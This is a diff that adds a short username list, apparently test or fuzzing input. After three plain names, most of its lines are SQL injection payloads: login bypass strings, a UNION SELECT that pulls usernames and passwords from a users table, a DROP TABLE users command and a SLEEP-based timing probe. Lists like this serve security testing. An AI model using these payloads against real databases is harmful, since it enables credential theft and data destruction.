@@ -1,0 +1,13 @@
+alice
+bob
+admin
+' OR '1'='1
+admin' --
+' OR 1=1 --
+' UNION SELECT username, password FROM users --
+' OR 'a'='a
+'; DROP TABLE users; --
+' OR SLEEP(5) --
+"' OR "" = "
+' or '1'='1' /*
+' UNION SELECT null,null --
